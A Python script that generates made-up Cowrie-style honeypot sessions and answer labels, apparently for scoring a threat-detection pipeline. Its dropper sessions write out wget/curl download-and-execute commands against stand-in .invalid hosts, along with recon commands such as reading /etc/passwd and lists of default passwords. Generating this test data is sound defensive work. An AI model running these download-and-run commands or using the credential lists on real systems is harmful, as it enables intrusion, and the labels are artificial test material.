#!/usr/bin/env python3
"""
Generate MADE-UP honeypot sessions (Cowrie-style events) plus ground-truth labels.

Nothing here is real attacker data:
  - every address comes from ranges reserved for documentation
  - every web link uses the reserved ".invalid" domain
  - every file fingerprint is derived from a made-up name

Outputs (in --out):
  sessions.jsonl  one event per line, sorted by time  <- what your pipeline reads
  labels.json     the correct answer per session      <- only for measuring accuracy

Usage:
  python3 generate_logs.py --n 2000 --seed 42 --out data
"""
import argparse
import hashlib
import json
import os
import random
from collections import Counter
from datetime import datetime, timedelta, timezone

# ---------------------------------------------------------------- ingredients
IP_RANGES = ["203.0.113", "198.51.100", "192.0.2"]  # reserved for documentation

USERS = ["root", "admin", "user", "test", "pi", "ubuntu", "support", "guest",
         "oracle", "postgres", "ftpuser", "default"]
PASSWORDS = ["123456", "password", "admin", "admin123", "root", "1234", "12345",
             "qwerty", "letmein", "raspberry", "toor", "default", "changeme",
             "pass", "0000", "111111", "welcome", "abc123", "support", "user"]
DEFAULT_CREDS = [("admin", "admin"), ("root", "root"), ("root", "123456"),
                 ("user", "user"), ("pi", "raspberry"), ("admin", "1234"),
                 ("support", "support"), ("root", "toor")]

SCANNER_VERSIONS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0",
                    "SSH-2.0-masscan", "SSH-2.0-zgrab2"]
HUMAN_VERSIONS = ["SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-OpenSSH_9.2", "SSH-2.0-PuTTY_Release_0.78"]

RECON_CMDS = ["whoami", "uname -a", "cat /proc/cpuinfo", "ls -la", "id", "w",
              "cat /etc/passwd", "free -m", "df -h", "ps aux", "ifconfig",
              "cat /etc/os-release", "uptime", "ls /home", "crontab -l"]

ARCHES = ["arm7", "mips", "x86", "arm5"]

# A few "campaigns": the same attacker group reusing the same link and files.
CAMPAIGNS = [
    {"id": "campaign-A", "host": "files-alpha.example.invalid", "name": "bins", "weight": 4},
    {"id": "campaign-B", "host": "cdn-beta.example.invalid", "name": "update", "weight": 3},
    {"id": "campaign-C", "host": "dl-gamma.example.invalid", "name": "x", "weight": 2},
    {"id": "campaign-D", "host": "static-delta.example.invalid", "name": "sh", "weight": 1},
]

CLASS_WEIGHTS = [("scan", 0.45), ("brute_force", 0.25), ("dropper", 0.20), ("recon", 0.10)]
HARD_PROB = 0.20  # share of sessions (every class) that use a trickier, overlapping variant


def fingerprint(campaign_id, arch):
    return hashlib.sha256(f"{campaign_id}-{arch}".encode()).hexdigest()


def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


# ---------------------------------------------------------------- builder
class Builder:
    def __init__(self, rng, sid, ip, start):
        self.rng, self.sid, self.ip = rng, sid, ip
        self.start, self.t = start, start
        self.events = []

    def add(self, eventid, gap=0.0, **kw):
        self.t += timedelta(seconds=gap)
        ev = {"timestamp": iso(self.t), "session": self.sid, "src_ip": self.ip,
              "eventid": eventid}
        ev.update(kw)
        self.events.append(ev)

    def login(self, user, pwd, ok, gap):
        self.add("login.success" if ok else "login.failed", gap=gap,
                 username=user, password=pwd)

    def cmd(self, text, gap):
        self.add("command.input", gap=gap, input=text)

    def close(self, gap):
        self.t += timedelta(seconds=gap)
        self.events.append({"timestamp": iso(self.t), "session": self.sid,
                            "src_ip": self.ip, "eventid": "session.closed",
                            "duration": round((self.t - self.start).total_seconds(), 2)})


def connect(b, ssh, scanner):
    b.add("session.connect", dst_port=22 if ssh else 23,
          protocol="ssh" if ssh else "telnet", src_port=b.rng.randint(1024, 65535))
    if ssh:
        versions = SCANNER_VERSIONS if scanner else HUMAN_VERSIONS
        b.add("client.version", gap=0.05, version=b.rng.choice(versions))


# ---------------------------------------------------------------- session types
def s_scan(b, hard):
    rng = b.rng
    connect(b, rng.random() < 0.8, scanner=True)
    if hard:  # cautious probe: a few slow login tries to test whether logins are open, then leaves
        for _ in range(rng.randint(1, 5)):
            b.login(rng.choice(USERS), rng.choice(PASSWORDS), False, rng.uniform(1.0, 4.0))
        b.close(rng.uniform(0.5, 3.0))
    else:
        b.close(rng.uniform(0.3, 3.5))
    return {"behaviors": ["scanning"], "urls": [], "hashes": [], "campaign": None}


def s_brute(b, hard):
    rng = b.rng
    connect(b, rng.random() < 0.7, scanner=True)
    variant = rng.choice(["wins_then_leaves", "low_and_slow"]) if hard else "normal"
    if variant == "low_and_slow":  # few, slow guesses to avoid being noticed: looks like a probe
        for _ in range(rng.randint(3, 12)):
            b.login(rng.choice(USERS), rng.choice(PASSWORDS), False, rng.uniform(1.0, 4.0))
    else:
        for _ in range(rng.randint(6, 60)):
            b.login(rng.choice(USERS), rng.choice(PASSWORDS), False, rng.uniform(0.15, 1.0))
    if variant == "wins_then_leaves":  # a guess works, then the visitor leaves immediately
        u, p = rng.choice(DEFAULT_CREDS)
        b.login(u, p, True, rng.uniform(0.15, 0.6))
    b.close(rng.uniform(0.2, 1.5))
    return {"behaviors": ["password_guessing"], "urls": [], "hashes": [], "campaign": None}


def s_dropper(b, hard, campaigns):
    rng = b.rng
    ssh = rng.random() < 0.6
    connect(b, ssh, scanner=True)
    for _ in range(rng.randint(0, 3)):
        b.login(rng.choice(USERS), rng.choice(PASSWORDS), False, rng.uniform(0.2, 0.9))
    u, p = rng.choice(DEFAULT_CREDS)
    b.login(u, p, True, rng.uniform(0.2, 0.9))

    camp = rng.choices(campaigns, weights=[c["weight"] for c in campaigns])[0]
    arches = rng.sample(ARCHES, rng.choice([1, 1, 2, 3]))
    urls, hashes, files = [], [], []
    # hard variants: file is downloaded but never run, OR the download fails (no file arrives)
    # yet the script blindly carries on and tries to run it anyway
    variant = rng.choice(["no_exec", "failed_fetch"]) if hard else "normal"

    b.cmd("uname -a", rng.uniform(0.3, 1.2))
    b.cmd(rng.choice(["cd /tmp", "cd /var/run", "cd /dev/shm"]), rng.uniform(0.3, 1.0))
    for arch in arches:
        fname = f"{camp['name']}.{arch}"
        url = f"http://{camp['host']}/{fname}"
        tool = rng.choice(["wget", "curl -O", "busybox wget"])
        b.cmd(f"{tool} {url}", rng.uniform(0.3, 1.5))
        urls.append(url)
        files.append(fname)
        if variant != "failed_fetch":
            sha = fingerprint(camp["id"], arch)
            b.add("file.download", gap=rng.uniform(0.3, 2.0), url=url, outfile=fname, shasum=sha)
            hashes.append(sha)

    behaviors = ["password_guessing", "tool_download"]
    if variant != "no_exec":
        for fname in files:
            b.cmd(f"chmod +x {fname}", rng.uniform(0.3, 1.0))
            b.cmd(f"./{fname}", rng.uniform(0.3, 1.0))
        if rng.random() < 0.4:
            b.cmd("rm -rf " + " ".join(files), rng.uniform(0.5, 2.0))
        behaviors.append("run_downloaded_file")
    b.close(rng.uniform(0.5, 3.0))
    return {"behaviors": behaviors, "urls": urls, "hashes": hashes, "campaign": camp["id"]}


def s_recon(b, hard):
    rng = b.rng
    connect(b, True, scanner=False)
    for _ in range(rng.randint(0, 2)):
        b.login(rng.choice(USERS), rng.choice(PASSWORDS), False, rng.uniform(1.0, 5.0))
    u, p = rng.choice(DEFAULT_CREDS)
    b.login(u, p, True, rng.uniform(1.0, 5.0))
    cmds = rng.sample(RECON_CMDS, rng.randint(3, 6))
    # hard variants: a script that types as fast as a program, OR a visitor who also checks
    # whether the machine can reach the internet (a fetch command, but nothing is downloaded or run)
    variant = rng.choice(["scripted", "internet_check"]) if hard else "normal"
    for c in cmds:
        # humans pause between commands; a script does not
        b.cmd(c, rng.uniform(0.2, 1.0) if variant == "scripted" else rng.uniform(2.0, 25.0))
    if variant == "internet_check":
        b.cmd("curl -s http://checkip.example.invalid/", rng.uniform(2.0, 10.0))
    b.close(rng.uniform(1.0, 10.0))
    return {"behaviors": ["system_discovery"], "urls": [], "hashes": [], "campaign": None}


# ---------------------------------------------------------------- main
def generate(n, seed):
    rng = random.Random(seed)
    window_start = datetime(2026, 11, 1, tzinfo=timezone.utc)
    labels, events = [], []
    classes = [c for c, _ in CLASS_WEIGHTS]
    weights = [w for _, w in CLASS_WEIGHTS]

    for _ in range(n):
        label = rng.choices(classes, weights=weights)[0]
        hard = rng.random() < HARD_PROB
        sid = "%012x" % rng.getrandbits(48)
        ip = f"{rng.choice(IP_RANGES)}.{rng.randint(1, 254)}"
        start = window_start + timedelta(seconds=rng.uniform(0, 14 * 24 * 3600))
        b = Builder(rng, sid, ip, start)

        if label == "scan":
            truth = s_scan(b, hard)
        elif label == "brute_force":
            truth = s_brute(b, hard)
        elif label == "dropper":
            truth = s_dropper(b, hard, CAMPAIGNS)
        else:
            truth = s_recon(b, hard)

        events.extend(b.events)
        labels.append({"session": sid, "label": label,
                       "difficulty": "hard" if hard else "normal",
                       "src_ip": ip, "behaviors": truth["behaviors"],
                       "evidence": {"urls": truth["urls"], "hashes": truth["hashes"]},
                       "campaign": truth["campaign"]})
    events.sort(key=lambda e: e["timestamp"])
    return events, labels


def self_check(events, labels):
    """Every labelled evidence item must literally appear in that session's events."""
    by_session = {}
    for e in events:
        by_session.setdefault(e["session"], []).append(json.dumps(e))
    for lab in labels:
        blob = "\n".join(by_session[lab["session"]])
        for item in lab["evidence"]["urls"] + lab["evidence"]["hashes"]:
            assert item in blob, f"labelled evidence missing from log: {item}"
        evs = [json.loads(x) for x in by_session[lab["session"]]]
        assert evs[0]["eventid"] == "session.connect", "session must start with connect"
        assert evs[-1]["eventid"] == "session.closed", "session must end with closed"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=2000)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default="data")
    a = ap.parse_args()

    events, labels = generate(a.n, a.seed)
    self_check(events, labels)
    os.makedirs(a.out, exist_ok=True)
    with open(os.path.join(a.out, "sessions.jsonl"), "w") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")
    with open(os.path.join(a.out, "labels.json"), "w") as f:
        json.dump(labels, f, indent=1)

    mix = Counter(l["label"] for l in labels)
    hard = sum(1 for l in labels if l["difficulty"] == "hard")
    print(f"sessions: {len(labels)}   events: {len(events)}   hard cases: {hard}")
    for k, v in mix.most_common():
        print(f"  {k:12s} {v}")
    print("self-check passed: every labelled evidence item appears in the log")


if __name__ == "__main__":
    main()
